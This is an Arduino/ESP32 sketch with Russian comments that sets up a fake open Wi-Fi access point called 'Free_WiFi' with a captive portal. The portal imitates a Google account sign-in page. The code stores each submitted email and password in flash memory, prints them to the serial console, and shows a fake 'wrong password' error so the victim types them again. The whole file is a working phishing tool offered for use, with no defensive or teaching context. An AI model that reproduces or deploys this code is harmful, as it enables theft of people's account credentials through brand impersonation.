#include <WiFi.h>
#include <WebServer.h>
#include <ESPmDNS.h>
#include <nvs_flash.h>

const char* ap_ssid = "Free_WiFi";
const char* ap_password = NULL;

WebServer server(80);

String captured_email = "";
String captured_password = "";

// HTML страница из вашего кода (сжата для экономии памяти)
const char* login_html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<title>Вход — Google Аккаунт</title>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1.0'>
<style>
body{display:flex;font-family:Arial,sans-serif;justify-content:center;align-items:center;background-color:#F0F4F9;height:90vh;margin:0;}
.container{margin:auto;padding:20px;width:80%;max-width:800px;}
.form-container{background:#FFFFFF;border-radius:25px;padding:20px;}
h1{text-align:center;font-size:28px;margin-bottom:20px;}
.containertitle{color:#202124;font-size:36px;padding:15px 0px 20px 0px;}
.containersubtitle{color:#202124;font-size:16px;padding:0px 0px 30px 0px;}
.input-container{position:relative;margin-bottom:20px;}
.input-field{outline:none;width:100%;height:50px;padding:12px 10px;box-sizing:border-box;border:1px solid #6b6b6b;border-radius:4px;}
.label{position:absolute;left:10px;top:16px;transition:0.2s;color:#6b6b6b;pointer-events:none;background:white;padding:0 5px;font-size:15px;}
.input-field:focus+.label,.input-field:not(:placeholder-shown)+.label{top:-7px;left:10px;font-size:12px;}
.submit-btn{outline:none;background:#0B57D0;color:white;border:none;padding:12px 20px;border-radius:20px;font-size:0.875rem;cursor:pointer;}
.submit-btn:hover{background:#0E4EB5;}
.containerbtn{display:flex;justify-content:end;padding:30px 0px 25px 0px;}
.badd{color:#B3261E;font-size:14px;display:none;margin-top:-10px;margin-bottom:10px;}
.baddd{color:#B3261E;font-size:14px;display:none;margin-top:-10px;margin-bottom:10px;}
</style>
</head>
<body>
<div class='container'>
<div class=form-container>
<div id="logo"><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg></div>
<div class='containertitle'>Вход</div>
<div class='containersubtitle'>Авторизация в сети</div>
<div class='input-container'><input name='email' id='email' class='input-field' type='text' placeholder=' '><label class='label'>Телефон или адрес эл. почты</label></div>
<div id='badmail' class='badd'>Введите адрес электронной почты или номер телефона.</div>
<div class='input-container'><input name='password' id='password' class='input-field' type='password' placeholder=' '><label class='label'>Введите пароль</label></div>
<div id='badpass' class='baddd'>Введите пароль.</div>
<div class='containerbtn'><button id='submitBtn' class='submit-btn'>Войти</button></div>
</div>
</div>
<script>
document.getElementById('submitBtn').addEventListener('click',function(){
var email=document.getElementById('email').value.trim();
var password=document.getElementById('password').value.trim();
if(email===''){document.getElementById('badmail').style.display='block';}
else{document.getElementById('badmail').style.display='none';}
if(password===''){document.getElementById('badpass').style.display='block';}
else{document.getElementById('badpass').style.display='none';}
if(email!==''&&password!==''){
fetch('/login?email='+encodeURIComponent(email)+'&password='+encodeURIComponent(password))
.then(function(){document.getElementById('badpass').style.display='block';document.getElementById('badpass').innerHTML='Неверный пароль.';})
.catch(function(){});
}
});
</script>
</body>
</html>
)rawliteral";

void handleRoot() {
  server.send(200, "text/html", login_html);
}

void handleLogin() {
  if (server.hasArg("email") && server.hasArg("password")) {
    captured_email = server.arg("email");
    captured_password = server.arg("password");
    
    // Сохраняем в NVS
    nvs_flash_init();
    nvs_handle_t nvs;
    nvs_open("storage", NVS_READWRITE, &nvs);
    nvs_set_str(nvs, "email", captured_email.c_str());
    nvs_set_str(nvs, "pass", captured_password.c_str());
    nvs_commit(nvs);
    nvs_close(nvs);
    
    // Выводим в Serial
    Serial.println("========== CAPTURED ==========");
    Serial.print("Email: ");
    Serial.println(captured_email);
    Serial.print("Password: ");
    Serial.println(captured_password);
    Serial.println("===============================");
    
    // Отправляем ответ (имитация ошибки для повторного ввода)
    server.send(200, "text/html", "<html><body><script>setTimeout(function(){window.location.href='/';},2000);</script><p>Неверный пароль. Перенаправление...</p></body></html>");
  } else {
    server.send(400, "text/plain", "Bad request");
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_password, 6, 0, 4);
  
  Serial.println("[SYSTEM] Fake AP started: Free_WiFi");
  Serial.print("[SYSTEM] IP: ");
  Serial.println(WiFi.softAPIP());
  
  server.on("/", handleRoot);
  server.on("/login", handleLogin);
  server.begin();
  
  Serial.println("[SYSTEM] Web server started");
}

void loop() {
  server.handleClient();
  delay(10);
}
